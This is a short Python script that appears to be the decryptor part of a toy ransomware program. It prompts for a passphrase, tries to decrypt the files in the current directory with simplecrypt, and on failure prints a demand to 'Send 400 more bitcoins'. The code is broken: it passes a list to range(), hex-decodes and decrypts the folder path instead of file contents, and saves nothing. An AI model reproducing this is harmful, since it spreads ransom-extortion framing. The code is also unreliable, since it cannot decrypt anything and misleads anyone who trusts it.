import os
from simplecrypt import decrypt

passphrase = input("Enter the passphrase provided: ")
file_path = os.getcwd()
list_dir = os.listdir(file_path)
try:
    for i in range(list_dir):
        file_bytes = bytes.fromhex(file_path)
        files_d = decrypt(passphrase, file_path)
        decode = files_d.decode('utf-8')
        print("Very Well! Files decrypted.")
except:
    print("Wrong decryption key! Send 400 more bitcoins")   